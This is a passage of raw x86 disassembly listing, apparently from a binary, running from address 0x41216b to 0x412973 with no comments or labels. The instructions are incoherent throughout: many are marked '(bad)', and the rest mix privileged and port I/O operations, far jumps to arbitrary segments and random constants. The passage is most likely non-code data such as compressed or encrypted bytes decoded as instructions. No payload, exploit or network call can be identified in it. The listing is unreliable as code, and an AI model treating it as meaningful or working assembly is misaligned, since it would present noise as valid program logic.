  41216b:	shl    ch,cl
  41216d:	sbb    al,0x3a
  41216f:	push   ebx
  412170:	cwde   
  412171:	(bad)  
  412172:	jne    0x41219b
  412174:	xchg   edi,eax
  412175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412176:	cmc    
  412177:	cdq    
  412178:	rcr    BYTE PTR [ecx+0x479c9dd7],1
  41217e:	push   ebp
  41217f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412180:	arpl   WORD PTR [eax+0x2f],dx
  412183:	ja     0x41213b
  412185:	sub    al,0xb3
  412187:	(bad)  
  412189:	inc    esp
  41218a:	xor    esi,DWORD PTR [edx+edi*2-0x24]
  41218e:	inc    ecx
  41218f:	sti    
  412190:	pop    ecx
  412191:	jge    0x41213b
  412193:	xchg   BYTE PTR [esi+0x3a],ah
  412196:	loop   0x4121bf
  412198:	jnp    0x4121f5
  41219a:	rcr    DWORD PTR [ecx+0x4a],0xf0
  41219e:	inc    ebp
  41219f:	mov    esp,0x53b72462
  4121a4:	xchg   ecx,eax
  4121a5:	or     ch,BYTE PTR [ebx]
  4121a7:	adc    DWORD PTR [ebx+0x69de7865],edi
  4121ad:	test   al,ah
  4121af:	pop    es
  4121b0:	jp     0x41215f
  4121b2:	mov    ebp,0x3cc47400
  4121b7:	push   ebp
  4121b8:	jo     0x41213b
  4121ba:	cmp    eax,0x6e680fdd
  4121bf:	adc    al,0x66
  4121c1:	sub    BYTE PTR [ebx-0xe],cl
  4121c4:	ss mov ebx,ebx
  4121c7:	cs dec esp
  4121c9:	or     ebx,ebx
  4121cb:	mov    fs,WORD PTR [edi+0x7aeed5e4]
  4121d1:	push   cs
  4121d2:	sub    eax,0x4c764e9a
  4121d7:	sub    BYTE PTR [ebx+0x21],ch
  4121da:	pop    edx
  4121db:	sub    al,0x32
  4121dd:	mov    esi,0x819292d3
  4121e2:	out    0x11,al
  4121e4:	xchg   esi,eax
  4121e5:	xchg   edi,eax
  4121e6:	pop    ebx
  4121e7:	fisttp WORD PTR [ebx]
  4121e9:	jg     0x4121c3
  4121eb:	push   ss
  4121ec:	or     edi,DWORD PTR [ebx]
  4121ee:	fsub   DWORD PTR [edx-0x40]
  4121f1:	inc    edx
  4121f2:	test   DWORD PTR fs:[edi-0xe],edx
  4121f6:	cmp    cl,dl
  4121f8:	dec    edx
  4121f9:	mov    bl,bl
  4121fb:	or     al,0xbf
  4121fd:	loopne 0x412229
  4121ff:	jecxz  0x412189
  412201:	stos   DWORD PTR es:[edi],eax
  412202:	mov    ebx,0xffe3cd9f
  412207:	mov    edx,0x32d53f61
  41220c:	ja     0x412215
  41220e:	loope  0x412241
  412210:	mov    ds:0xefa8058a,eax
  412215:	push   eax
  412216:	nop
  412217:	sbb    bl,bh
  412219:	lahf   
  41221a:	stc    
  41221b:	int    0x3f
  41221d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41221e:	cmp    edi,esi
  412220:	pop    esp
  412221:	dec    ebp
  412222:	jp     0x412201
  412224:	bound  eax,QWORD PTR [ebx-0x8]
  412227:	sub    eax,0xa2ecacae
  41222c:	pop    ebx
  41222d:	clc    
  41222e:	dec    ebp
  41222f:	lods   eax,DWORD PTR cs:[esi]
  412231:	mov    ds:0x52527486,al
  412236:	dec    esp
  412237:	sar    DWORD PTR [eax+0x6ae6e054],0x94
  41223e:	repz retf 
  412240:	pusha  
  412241:	ficom  WORD PTR [edi-0xa]
  412244:	inc    eax
  412245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412246:	call   0x4d38c10d
  41224b:	ds ins BYTE PTR es:[edi],dx
  41224d:	push   esp
  41224e:	mov    ecx,0xf014466f
  412253:	aas    
  412254:	(bad)  
  412255:	mul    DWORD PTR [edi+0x78d933b7]
  41225b:	test   eax,0x5d956e50
  412260:	lock icebp 
  412262:	mov    al,dl
  412264:	cmc    
  412265:	std    
  412266:	mov    eax,0xa2faebbb
  41226b:	das    
  41226c:	call   0x58e5f236
  412271:	repz add BYTE PTR [esi-0x1d734920],al
  412278:	pop    ds
  412279:	test   BYTE PTR [ebp-0x60],bl
  41227c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41227d:	push   ss
  41227e:	arpl   WORD PTR [ebp+0x1a937a1],cx
  412284:	scas   eax,DWORD PTR es:[edi]
  412285:	imul   ebp,DWORD PTR [eax+0x6],0xffffffef
  412289:	push   ebp
  41228a:	(bad)  
  41228b:	push   ds
  41228c:	gs loop 0x4122c3
  41228f:	mov    bh,0x23
  412291:	or     dh,ah
  412293:	adc    ebx,edi
  412295:	sysenter 
  412297:	sbb    ecx,DWORD PTR ds:0x4a48fc53
  41229d:	mov    ebp,DWORD PTR [edi]
  41229f:	dec    esp
  4122a0:	push   ds
  4122a1:	xchg   esp,ebp
  4122a3:	add    al,0x32
  4122a5:	aam    0x46
  4122a7:	jle    0x412235
  4122a9:	das    
  4122aa:	mov    eax,0x6e4e7f2f
  4122af:	push   cs
  4122b0:	add    eax,0xb53b96fc
  4122b5:	in     al,0xbb
  4122b7:	out    0xd5,al
  4122b9:	fdivr  QWORD PTR [ebp-0x18ed29fb]
  4122bf:	sbb    ecx,DWORD PTR [ebp-0x6e8f65dd]
  4122c5:	shl    DWORD PTR [ecx],cl
  4122c7:	push   0x3e500a7a
  4122cc:	mov    WORD PTR [edi+0x3e9f5d12],?
  4122d2:	or     ebx,0x429ce13
  4122d8:	inc    eax
  4122d9:	test   DWORD PTR [ecx-0x7e],0x2f075326
  4122e0:	aam    0x4f
  4122e2:	add    DWORD PTR [ebp+0x7c64c868],edx
  4122e8:	sbb    BYTE PTR [edx+0x3bae7aa5],ah
  4122ee:	mov    edi,0x3fa5b7d1
  4122f3:	loop   0x412310
  4122f5:	sub    eax,DWORD PTR [edi-0x39204311]
  4122fb:	sub    al,0xde
  4122fe:	shr    BYTE PTR [ecx+edi*1+0x814320b],cl
  412305:	or     eax,0xb9d1a38d
  41230a:	xchg   edi,eax
  41230b:	mov    cl,0x0
  41230d:	out    dx,eax
  41230e:	nop
  41230f:	(bad)  
  412311:	sbb    eax,0xc4fff7a2
  412316:	xchg   edi,eax
  412317:	fimul  WORD PTR [ebx+eiz*2-0x69]
  41231b:	push   DWORD PTR cs:[esp+edx*8+0x6c55e7cf]
  412323:	mov    ch,0x1e
  412325:	(bad)  
  412326:	mov    ds:0x7f6f0c22,eax
  41232b:	sti    
  41232c:	sub    DWORD PTR [ecx],esp
  41232e:	xor    eax,DWORD PTR [ebx-0x3e70d62c]
  412334:	inc    edi
  412335:	fld    TBYTE PTR [ebp+0x43]
  412338:	lods   al,BYTE PTR ds:[esi]
  412339:	dec    DWORD PTR [edi-0x61]
  41233c:	stc    
  41233d:	in     eax,dx
  41233e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41233f:	out    0x7a,al
  412341:	mov    cl,bh
  412343:	(bad)  
  412344:	and    al,0x30
  412346:	cmp    BYTE PTR [ecx],ch
  412348:	xchg   ebx,eax
  412349:	pop    eax
  41234a:	dec    ebp
  41234b:	in     eax,dx
  41234c:	dec    ebx
  41234d:	mov    esi,0x36e45552
  412352:	call   0x611c2203
  412357:	push   esi
  412358:	shl    BYTE PTR [edx-0x1a991158],0x25
  41235f:	or     BYTE PTR [ebp-0x52],cl
  412362:	add    edi,esi
  412364:	inc    ebx
  412365:	nop
  412366:	icebp  
  412367:	mov    ebx,0xd9c94ef8
  41236c:	mov    ebx,0xfbd84b22
  412371:	cmc    
  412372:	sbb    BYTE PTR [edx],0x61
  412375:	loopne 0x412374
  412377:	pop    ebx
  412378:	dec    BYTE PTR [ebp+0x31004901]
  41237e:	jae    0x412399
  412380:	scas   al,BYTE PTR es:[edi]
  412381:	fs pop ecx
  412383:	call   FWORD PTR [ebx+0x29c6d1b0]
  412389:	iret   
  41238a:	daa    
  41238b:	pushf  
  41238c:	icebp  
  41238d:	mov    bh,0x31
  41238f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412390:	push   0xffffffb9
  412392:	and    al,0xb3
  412394:	dec    edi
  412395:	dec    ebp
  412396:	int    0x5c
  412398:	lea    esp,[edi+ecx*8+0x3a]
  41239c:	sbb    DWORD PTR [ecx],ecx
  41239e:	pop    ds
  41239f:	adc    eax,0x641a5344
  4123a4:	mov    bl,0x8d
  4123a6:	push   edi
  4123a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123a8:	and    al,0xf8
  4123aa:	and    eax,0xfa6fad35
  4123af:	xor    DWORD PTR [ebp-0xf],ecx
  4123b2:	mov    dh,0x7
  4123b4:	fst    DWORD PTR [eax]
  4123b6:	js     0x412386
  4123b8:	add    BYTE PTR [edx+0x35],bl
  4123bb:	shl    cl,cl
  4123bd:	mov    ch,0x6f
  4123bf:	sbb    al,0x46
  4123c1:	inc    esp
  4123c2:	cmp    DWORD PTR ds:0x2864316b,ebx
  4123c8:	jb     0x41236d
  4123ca:	pop    DWORD PTR [ebp-0x58c3714a]
  4123d0:	mov    bl,0xfa
  4123d2:	(bad)  
  4123d3:	aad    0x8f
  4123d5:	jmp    0x776a:0x61555166
  4123dc:	neg    bl
  4123de:	sbb    eax,0xba2d340
  4123e3:	fwait
  4123e4:	jne    0x4123b6
  4123e6:	adc    BYTE PTR [edi-0x19],ah
  4123e9:	sbb    ebp,esi
  4123eb:	adc    DWORD PTR [ecx+0x29a6025f],ecx
  4123f1:	adc    BYTE PTR [ecx-0xd],cl
  4123f4:	push   cs
  4123f5:	rcr    eax,1
  4123f7:	add    bl,BYTE PTR [eax-0x4]
  4123fa:	xor    BYTE PTR [ebx],cl
  4123fc:	xchg   edx,eax
  4123fd:	xor    al,dl
  4123ff:	test   al,0xcb
  412401:	inc    ecx
  412402:	or     BYTE PTR [ebp+0x1c],dl
  412405:	jno    0x4123bc
  412407:	sbb    eax,DWORD PTR [ebx]
  412409:	push   ds
  41240a:	xchg   edi,eax
  41240b:	cdq    
  41240c:	popf   
  41240d:	mov    bh,0x72
  41240f:	push   ecx
  412410:	lahf   
  412411:	cmp    eax,0xb619dd39
  412416:	loope  0x41248b
  412418:	mov    al,0x17
  41241a:	xlat   BYTE PTR ds:[ebx]
  41241b:	out    0x6e,al
  41241d:	outs   dx,BYTE PTR ds:[esi]
  41241e:	fidivr WORD PTR [ebp+0x5c]
  412421:	arpl   bp,bx
  412423:	mov    bh,0xdf
  412425:	sub    eax,0xa941d399
  41242a:	sub    bl,BYTE PTR [edi]
  41242c:	jecxz  0x4123ca
  41242e:	shl    ecx,1
  412430:	arpl   WORD PTR [eax],si
  412432:	enter  0x23d9,0x19
  412436:	or     DWORD PTR [edx-0x707a6c9d],esi
  41243c:	push   edi
  41243d:	jp     0x4124b1
  41243f:	ja     0x41240e
  412441:	mov    bl,0xe7
  412443:	mov    ds:0xd6201a61,eax
  412448:	jns    0x412417
  41244a:	jge    0x412454
  41244c:	push   eax
  41244d:	(bad)  
  41244e:	sbb    ebx,ebx
  412450:	mov    DWORD PTR [ebp-0x46],ecx
  412453:	shr    dl,1
  412455:	rcl    DWORD PTR [ecx],1
  412457:	pop    ebp
  412458:	lods   eax,DWORD PTR ss:[esi]
  41245a:	pop    edx
  41245b:	mov    cl,0x65
  41245d:	lods   eax,DWORD PTR ds:[esi]
  41245e:	and    al,0xae
  412460:	jmp    eax
  412462:	sub    al,0xed
  412464:	test   eax,0x578d854f
  412469:	(bad)
  41246c:	and    al,0xb6
  41246e:	pop    ds
  41246f:	mov    dh,0xe4
  412471:	dec    ecx
  412472:	outs   dx,DWORD PTR ds:[esi]
  412473:	pop    ss
  412474:	pop    ss
  412475:	mov    esp,0x1e3b42fe
  41247a:	lss    esi,FWORD PTR [ebx+ebp*4-0x31]
  41247f:	xchg   edi,eax
  412480:	pop    ds
  412481:	xchg   esp,eax
  412482:	fidiv  DWORD PTR [ebx+eiz*2+0x48f7702a]
  412489:	and    cl,BYTE PTR [edx]
  41248b:	jmp    0x18ca:0xdf643b72
  412492:	mov    ds:0x37243820,eax
  412497:	test   DWORD PTR [edx-0x343194b8],ebp
  41249d:	leave  
  41249e:	mov    edx,0x7006756b
  4124a3:	fidivr DWORD PTR [ecx-0x7b]
  4124a6:	fimul  DWORD PTR [edi+0x1d0dd9c5]
  4124ac:	push   es
  4124ad:	in     al,0x90
  4124af:	(bad)  
  4124b0:	pop    eax
  4124b1:	ins    DWORD PTR es:[edi],dx
  4124b2:	mov    esi,0xf1f0c958
  4124b7:	mov    ebx,0xfb2aab81
  4124bc:	add    al,0xd5
  4124be:	fild   WORD PTR [esi]
  4124c0:	xchg   DWORD PTR [edx-0x6b],eax
  4124c3:	pop    edx
  4124c4:	pop    ebp
  4124c5:	mov    edi,0x79273999
  4124ca:	lods   al,BYTE PTR ds:[esi]
  4124cb:	mov    ah,0x76
  4124cd:	or     al,0xa1
  4124cf:	aad    0xf
  4124d1:	mov    ch,0x95
  4124d3:	in     al,0xfc
  4124d5:	cld    
  4124d6:	push   esp
  4124d7:	out    0x40,eax
  4124d9:	mov    ?,WORD PTR [edi+eiz*8-0x77]
  4124dd:	lock cld 
  4124df:	jp     0x412522
  4124e1:	sti    
  4124e2:	shl    DWORD PTR [ebp+ecx*8+0x62],cl
  4124e6:	or     al,0xce
  4124e8:	loope  0x4124fa
  4124ea:	mov    dl,0x8f
  4124ec:	arpl   WORD PTR [ebx],di
  4124ee:	xchg   ebx,eax
  4124ef:	sub    BYTE PTR [eax+eiz*4+0x54],cl
  4124f3:	pop    ds
  4124f4:	push   esp
  4124f5:	dec    esp
  4124f6:	stos   DWORD PTR es:[edi],eax
  4124f7:	inc    eax
  4124f8:	and    ecx,DWORD PTR [edi+0x759ed640]
  4124fe:	popf   
  4124ff:	xchg   ebx,eax
  412500:	jbe    0x41252a
  412502:	ja     0x4124ea
  412504:	lahf   
  412505:	mov    cl,0x16
  412507:	(bad)  
  412508:	xor    ebp,DWORD PTR [ecx]
  41250a:	jmp    0x41250d
  41250c:	cmp    dl,BYTE PTR [esi-0x63b82d59]
  412512:	and    DWORD PTR [edi+0x6ba39bff],ebp
  412518:	mov    ?,WORD PTR [eax-0x79]
  41251b:	ror    BYTE PTR [edi+ebx*1-0x1b01b5f9],1
  412522:	imul   edi,DWORD PTR ds:0x16b85224,0x2a1d215c
  41252c:	retf   
  41252d:	call   0x7ce47f9b
  412532:	fnstcw WORD PTR [edi-0x66]
  412535:	jecxz  0x4124ba
  412537:	loope  0x4125b0
  412539:	mov    DWORD PTR [edi],0x2b03d0ba
  41253f:	push   ebp
  412540:	shl    DWORD PTR [eax],cl
  412542:	sub    edx,esp
  412544:	ret    0x38bf
  412547:	call   0x1ebe7b89
  41254c:	cld    
  41254d:	mov    eax,0x46d0735b
  412552:	mov    bh,bh
  412554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412555:	sub    BYTE PTR [eax-0x47],ah
  412558:	and    DWORD PTR [ecx+ebx*4],edx
  41255b:	push   edx
  41255c:	sar    DWORD PTR [eax-0x28],1
  41255f:	lea    eax,[ebp-0x6]
  412562:	xor    al,0xe0
  412564:	push   0xdcd8fbf9
  412569:	ins    BYTE PTR es:[edi],dx
  41256a:	mov    esi,0xaaefdf94
  41256f:	dec    ecx
  412570:	fadd   DWORD PTR [edx+0x32250d6c]
  412576:	mov    bh,0x37
  412578:	popf   
  412579:	xor    eax,0xf296e6b9
  41257e:	mov    cl,0xd3
  412580:	mov    eax,0x8fe4d47f
  412585:	xchg   edx,eax
  412586:	fidivr WORD PTR [ecx-0x5b]
  412589:	iret   
  41258a:	(bad)  
  41258b:	adc    ch,BYTE PTR [edx+0x5e2015b8]
  412591:	jae    0x4125a6
  412593:	test   al,0x78
  412595:	push   ds
  412596:	cmp    DWORD PTR [edi-0x60],ebp
  412599:	ret    
  41259a:	mov    WORD PTR [ebx],fs
  41259c:	jns    0x412594
  41259e:	adc    edx,eax
  4125a0:	push   edx
  4125a1:	in     al,0x44
  4125a3:	jnp    0x4125a7
  4125a5:	jno    0x41257a
  4125a7:	cmp    BYTE PTR [esi-0x15f5f11f],bh
  4125ad:	(bad)  
  4125ae:	jmp    0xc2bfec6c
  4125b3:	loop   0x4125c1
  4125b5:	sahf   
  4125b6:	test   eax,0xa388332c
  4125bb:	or     BYTE PTR [ebx-0x1d],0xd2
  4125bf:	add    BYTE PTR [eax-0x4d],ch
  4125c2:	int    0xd8
  4125c4:	sub    BYTE PTR [edi],dl
  4125c6:	mov    ebp,0x848f0330
  4125cb:	fdiv   QWORD PTR [eax-0x1d26d31f]
  4125d1:	and    al,0xf5
  4125d3:	xchg   ebp,eax
  4125d4:	sar    bl,0x62
  4125d7:	sub    ah,BYTE PTR [esi-0x12e1785e]
  4125dd:	into   
  4125de:	fcom   QWORD PTR [ecx]
  4125e0:	mov    ds:0x5f132823,eax
  4125e5:	add    ebx,DWORD PTR [ecx-0x276cabc1]
  4125eb:	rol    BYTE PTR [ebx],cl
  4125ed:	arpl   WORD PTR [ecx+0x6c35ac77],bp
  4125f3:	out    0x9b,al
  4125f5:	xlat   BYTE PTR ds:[ebx]
  4125f6:	push   0x3188f408
  4125fb:	cmp    cl,BYTE PTR [esi+0x607e1e62]
  412601:	mov    dh,0xbf
  412603:	out    dx,al
  412604:	in     al,dx
  412605:	add    BYTE PTR [edx+ebp*4+0x12],ch
  412609:	jns    0x412633
  41260b:	xchg   edx,eax
  41260c:	mov    al,0xcf
  41260e:	clc    
  41260f:	push   eax
  412610:	inc    ecx
  412611:	push   esp
  412612:	sahf   
  412613:	std    
  412614:	inc    edx
  412615:	xchg   ebp,eax
  412616:	pushf  
  412617:	fcom   DWORD PTR ds:0x847d8b27
  41261e:	lods   al,BYTE PTR ds:[esi]
  41261f:	dec    esi
  412620:	sbb    esp,esi
  412622:	and    ebx,ecx
  412624:	cli    
  412625:	inc    ecx
  412626:	popa   
  412627:	jle    0x41263e
  412629:	in     eax,dx
  41262a:	cmp    ebp,DWORD PTR [esi-0xd4a65a8]
  412630:	push   es
  412631:	ja     0x412624
  412633:	(bad)  fs:[ebx+0x4]
  412637:	loope  0x4125d6
  412639:	fisttp DWORD PTR [edx]
  41263b:	pushf  
  41263c:	aaa    
  41263d:	not    BYTE PTR [ebx-0x18]
  412640:	imul   esp,DWORD PTR [ebx],0xf7cd2396
  412646:	fisttp WORD PTR [ecx]
  412648:	outs   dx,DWORD PTR ds:[esi]
  412649:	push   0xffffffe2
  41264b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41264c:	jae    0x412678
  41264e:	xchg   ebx,eax
  41264f:	mov    DWORD PTR [ecx+0x25fefe34],ecx
  412655:	outs   dx,DWORD PTR ds:[esi]
  412656:	fdiv   QWORD PTR [ebp-0x45]
  412659:	mov    esp,0xd421cc7b
  41265e:	rcl    BYTE PTR [ebx+esi*8+0x5ef6b658],1
  412665:	leave  
  412666:	mov    ch,0x9d
  412668:	jae    0x41264e
  41266a:	enter  0x27fe,0x7b
  41266e:	fisubr DWORD PTR [eax+0x60de1839]
  412674:	push   ebx
  412675:	cmp    al,0x98
  412677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412678:	(bad)  
  41267a:	mov    edx,0x3b1d8dc0
  41267f:	sub    edx,DWORD PTR [edx]
  412681:	in     al,0xdf
  412683:	push   esp
  412684:	inc    ebp
  412685:	dec    ebx
  412686:	sbb    eax,0xe05270f3
  41268b:	xlat   BYTE PTR ds:[ebx]
  41268c:	and    esp,DWORD PTR [ecx-0x8]
  41268f:	stos   BYTE PTR es:[edi],al
  412690:	jnp    0x412646
  412692:	cmp    BYTE PTR [esi+edx*4-0x29],bl
  412696:	iret   
  412697:	adc    BYTE PTR [esi-0xd706a96],0x41
  41269e:	in     al,dx
  41269f:	sub    eax,0x21e84f4
  4126a4:	xchg   esp,eax
  4126a5:	or     bl,BYTE PTR [ebx+ebp*4+0x16]
  4126a9:	cmp    BYTE PTR [edi+eiz*4-0x32],0x1
  4126ae:	test   BYTE PTR [ecx],ah
  4126b0:	dec    edx
  4126b1:	sbb    bh,bl
  4126b3:	stos   DWORD PTR es:[edi],eax
  4126b4:	pop    eax
  4126b5:	mov    DWORD PTR [ebp+0x70405385],esp
  4126bb:	and    BYTE PTR [edx+eax*2-0x10],cl
  4126bf:	fadd   st,st(6)
  4126c1:	sbb    BYTE PTR [esi-0x7d8a0d33],bh
  4126c7:	ja     0x41264f
  4126c9:	push   eax
  4126ca:	not    BYTE PTR [eax]
  4126cc:	pop    ebx
  4126cd:	out    dx,eax
  4126ce:	stc    
  4126cf:	aad    0xcc
  4126d1:	out    dx,eax
  4126d2:	neg    DWORD PTR [esi]
  4126d4:	or     BYTE PTR [edi-0x3c461985],dl
  4126da:	or     ch,BYTE PTR [ebx-0x2c]
  4126dd:	sahf   
  4126de:	mov    eax,0xccdfde12
  4126e3:	push   edi
  4126e4:	rol    BYTE PTR [eax+0x7c],cl
  4126e7:	retf   0x41ce
  4126ea:	cmp    dh,BYTE PTR [edx-0x34440509]
  4126f0:	cdq    
  4126f1:	scas   eax,DWORD PTR es:[edi]
  4126f2:	ret    0xa9c4
  4126f5:	sub    BYTE PTR ds:0xba0dba4f,bl
  4126fb:	cli    
  4126fc:	test   BYTE PTR [esi-0x16],bl
  4126ff:	icebp  
  412700:	add    eax,DWORD PTR [ebx+eax*2+0x43d9a6f5]
  412707:	sbb    DWORD PTR [eax+0x5f37daae],ebx
  41270d:	jle    0x41271d
  41270f:	jb     0x412788
  412711:	cmp    eax,0xfadc029d
  412716:	sbb    al,0x48
  412718:	icebp  
  412719:	and    BYTE PTR ds:0x2eeeff63,0xe5
  412720:	mov    dh,0xa8
  412722:	(bad)  
  412723:	cmp    eax,DWORD PTR [ebx]
  412725:	mov    WORD PTR ss:[ebx+0x296152ff],cs
  41272c:	mov    ecx,0xc928eaa0
  412731:	push   esp
  412732:	dec    edx
  412733:	setbe  BYTE PTR [edi+ebx*4-0x65cd3cd3]
  41273b:	sti    
  41273c:	adc    eax,0xc761a2be
  412741:	pop    ebx
  412742:	mov    edi,0xe35a36e6
  412747:	fst    QWORD PTR [ebp+0xd5e3e20]
  41274d:	sub    al,0x3e
  41274f:	and    BYTE PTR [eax-0x6381321c],0x22
  412756:	sub    ecx,DWORD PTR [esi]
  412758:	mov    eax,ds:0xfb930c80
  41275d:	cmp    DWORD PTR [esp+ebp*8+0x65],esi
  412761:	jle    0x41277c
  412763:	jge    0x4126ef
  412765:	jl     0x412758
  412767:	or     eax,ebx
  412769:	add    al,0x6
  41276b:	xor    BYTE PTR [esi],al
  41276d:	jno    0x41270c
  41276f:	jle    0x4127ea
  412771:	popf   
  412772:	mov    dh,BYTE PTR [eax+0x18e68af6]
  412778:	addr16 mov esi,0x7c5563ce
  41277e:	xor    esi,DWORD PTR [eax]
  412780:	fist   DWORD PTR [edx+0x2443b9d2]
  412786:	push   edx
  412787:	jl     0x4127bc
  412789:	es in  eax,0x5c
  41278c:	adc    cl,al
  41278e:	or     al,0xbc
  412790:	into   
  412791:	mov    esp,0xd3a1dcc9
  412796:	push   0xfffffff5
  412798:	(bad)  
  412799:	retf   0x1277
  41279c:	bswap  edx
  41279e:	xchg   edi,eax
  41279f:	pop    ebp
  4127a0:	sbb    BYTE PTR [eax+0x70],cl
  4127a3:	retf   0xf118
  4127a6:	inc    ebp
  4127a7:	pop    DWORD PTR [edi+0x78]
  4127aa:	cmp    dh,BYTE PTR gs:[esi]
  4127ad:	aad    0xc3
  4127af:	ja     0x4127cb
  4127b1:	call   0xc084a25d
  4127b6:	enter  0x4c03,0xd
  4127ba:	icebp  
  4127bb:	repz sbb DWORD PTR [eax-0x3594750c],0xffffffd0
  4127c3:	call   DWORD PTR [edx]
  4127c5:	int    0x12
  4127c7:	mov    esi,0x4f446e0c
  4127cc:	push   ebx
  4127cd:	popf   
  4127ce:	inc    eax
  4127cf:	shr    BYTE PTR [edx-0x3d],cl
  4127d2:	push   ebp
  4127d3:	cmp    bh,BYTE PTR [esi+0x58658ea7]
  4127d9:	pop    ds
  4127da:	jl     0x412848
  4127dc:	lds    edi,FWORD PTR [edx+0x11]
  4127df:	in     al,dx
  4127e0:	mov    esp,0x30344cef
  4127e5:	jmp    0x4d5c:0x3612d2b7
  4127ec:	lahf   
  4127ed:	jmp    0x41278f
  4127ef:	xchg   ebx,eax
  4127f0:	or     eax,0xafc777ed
  4127f5:	add    ebx,DWORD PTR [edx-0x5c57260b]
  4127fb:	stos   DWORD PTR es:[edi],eax
  4127fc:	retf   
  4127fd:	jecxz  0x4127f2
  4127ff:	je     0x4127f0
  412801:	dec    ebx
  412802:	xlat   BYTE PTR ds:[ebx]
  412803:	cmp    BYTE PTR [edx],ah
  412805:	iret   
  412806:	fsub   st,st(3)
  412808:	(bad)  
  412809:	int    0x53
  41280b:	mov    eax,ds:0xd25aaeea
  412810:	popf   
  412811:	xchg   sp,ax
  412813:	loopne 0x412808
  412815:	mov    ebp,0x203f6b9e
  41281a:	fwait
  41281b:	adc    al,0x3e
  41281d:	dec    ecx
  41281e:	enter  0xc70,0xa5
  412822:	sbb    al,0x89
  412824:	stos   DWORD PTR es:[edi],eax
  412825:	push   ss
  412826:	loop   0x41286a
  412828:	mov    bh,0x9e
  41282a:	xlat   BYTE PTR ds:[ebx]
  41282b:	jmp    0x3df8:0xfdeaf1a8
  412832:	add    eax,0x40608102
  412837:	test   BYTE PTR [esi-0xa276d05],bh
  41283d:	pop    edi
  41283e:	pop    edx
  412840:	mov    dh,0x5c
  412842:	sub    al,0xa9
  412844:	push   ecx
  412845:	popa   
  412846:	jmp    0xb1a80c7e
  41284b:	mov    eax,0x59ac6bb
  412850:	jo     0x41280a
  412852:	mov    esi,0x5a99e56a
  412857:	test   DWORD PTR [edx],0xaf25a34
  41285d:	scas   eax,DWORD PTR es:[edi]
  41285e:	mov    ds:0x3d00b7b,al
  412863:	inc    edi
  412864:	and    edi,0x5d
  412867:	sub    ebx,DWORD PTR [esi+0xad9e382]
  41286d:	fdivr  QWORD PTR [edi]
  41286f:	mov    al,0x78
  412871:	inc    esp
  412872:	add    al,0x1e
  412874:	vandnps ymm0,ymm7,ymm4
  412878:	aas    
  412879:	jmp    0x4128b1
  41287b:	inc    edx
  41287c:	imul   edi,ebx,0x2f
  41287f:	inc    eax
  412880:	scas   al,BYTE PTR es:[edi]
  412881:	cld    
  412882:	cld    
  412883:	ds ror dh,cl
  412886:	inc    ebx
  412887:	xchg   edi,eax
  412888:	ret    0xb42b
  41288b:	call   FWORD PTR ds:0xe667cf51
  412891:	inc    ebp
  412892:	out    0x3e,eax
  412894:	push   ebx
  412895:	(bad)  
  412896:	hlt    
  412897:	test   eax,0x52df7f35
  41289d:	outs   dx,DWORD PTR ds:[esi]
  41289e:	imul   edi,DWORD PTR [edx],0xfffffffb
  4128a1:	add    DWORD PTR [edi],0xffffffe9
  4128a4:	mov    edx,0xa54ecc41
  4128a9:	cmp    al,0x48
  4128ab:	out    0xc6,eax
  4128ad:	and    al,0x65
  4128af:	stos   DWORD PTR es:[edi],eax
  4128b0:	and    BYTE PTR [esi],0xd2
  4128b3:	inc    edi
  4128b4:	adc    al,0x22
  4128b6:	rcl    DWORD PTR [ebx-0x41],0x80
  4128ba:	mov    ecx,0x16e5c137
  4128bf:	push   ss
  4128c0:	mov    dh,BYTE PTR [edi]
  4128c2:	mov    esp,0x9c45ad2
  4128c7:	add    al,0x28
  4128ca:	sub    dl,ah
  4128cc:	xor    dh,BYTE PTR [esi+0x25]
  4128cf:	cmp    eax,0x32ecd715
  4128d4:	ret    0x379a
  4128d7:	mov    dh,ah
  4128d9:	out    0xac,al
  4128db:	add    ch,BYTE PTR [ecx]
  4128dd:	jns    0x412863
  4128df:	enter  0x23c9,0x82
  4128e3:	retf   0x8bbe
  4128e6:	add    DWORD PTR [ecx-0x19],ecx
  4128e9:	adc    BYTE PTR [edi-0x7999f91e],ch
  4128ef:	ret    
  4128f0:	jge    0x41289d
  4128f2:	adc    al,BYTE PTR [edx+0x45ddb66]
  4128f8:	(bad)  
  4128f9:	sti    
  4128fa:	xor    dl,ch
  4128fc:	mov    eax,ds:0x7e513edd
  412901:	lods   al,BYTE PTR ds:[esi]
  412902:	lahf   
  412903:	retf   0x3218
  412906:	mov    esp,0x16ad845b
  41290b:	cmp    al,0x17
  41290d:	mov    edi,0x1093d2bb
  412912:	add    ch,ch
  412914:	pushf  
  412915:	pop    ds
  412916:	pop    ebp
  412917:	ret    0xa7f6
  41291a:	mov    esi,0x8e9e9cdb
  41291f:	stos   BYTE PTR es:[edi],al
  412920:	fs cmc 
  412922:	das    
  412923:	mov    edx,0xbe84f0e1
  412928:	test   al,0x75
  41292a:	bound  esi,QWORD PTR [eax+0x2a]
  41292d:	cmp    al,0xbd
  41292f:	adc    DWORD PTR [ecx+0xb746b0c],ebp
  412935:	ret    
  412936:	pop    edi
  412937:	xor    BYTE PTR [edx+edx*4],cl
  41293a:	xor    DWORD PTR [eax-0x4dbdf510],eax
  412940:	push   ebp
  412941:	xor    BYTE PTR [edx+ebp*8+0x10da36a3],al
  412948:	inc    edx
  412949:	or     cl,BYTE PTR [edi]
  41294b:	push   esp
  41294c:	test   al,0x7a
  41294e:	adc    BYTE PTR [ecx+ebp*8],ah
  412951:	sbb    al,0x15
  412953:	jle    0x4128f6
  412955:	lahf   
  412956:	jl     0x41290d
  412958:	jbe    0x4129b4
  41295a:	nop
  41295b:	add    al,0x7f
  41295d:	mov    ebp,0xc9ed3e43
  412962:	inc    ebp
  412963:	clc    
  412964:	test   BYTE PTR [ebx-0xe0b686f],cl
  41296a:	lea    ecx,[esi]
  41296c:	dec    esp
  41296d:	repnz mov al,ds:0x10ac3e13
  412973:	dec    esp
